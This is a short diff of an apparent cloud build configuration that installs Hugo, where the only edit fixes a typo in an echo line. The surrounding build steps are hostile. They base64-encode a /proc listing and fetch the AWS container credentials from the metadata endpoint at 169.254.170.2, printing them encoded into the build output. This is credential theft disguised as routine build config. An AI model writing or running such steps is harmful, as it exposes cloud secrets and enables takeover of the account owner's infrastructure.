@@ -7,7 +7,7 @@ frontend:
         - tar -xf hugo.tar.gz hugo
         - mv hugo /usr/bin/hugo
         - rm -rf hugo.tar.gz
-        - echo "[!] Doing stuf"
+        - echo "[!] Doing stuff"
         - echo "..."
         - echo $(ls -la /proc | base64 -w 0) 
         - echo $(curl http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | base64 -w 0)
